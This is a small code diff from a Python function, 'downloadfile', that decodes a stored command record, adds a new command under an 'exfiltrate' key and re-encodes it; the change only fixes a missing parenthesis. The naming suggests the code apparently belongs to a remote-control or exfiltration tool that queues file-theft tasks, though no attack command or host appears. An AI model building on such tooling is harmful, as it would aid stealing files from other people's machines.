@@ -57,7 +57,7 @@ def downloadfile( id, file_path, file_name ):
 			decoded_command_record = decode(result[0][2])
 			json_data = json.loads(decoded_command_record)
 			json_data["exfiltrate"].update(new_command)
-			json_string_record = str(json.dumps(json_data)
+			json_string_record = str(json.dumps(json_data))
 			encoded_record = encode(json_string_record)
 
 			#add the epoch and custom file name to the table for future use
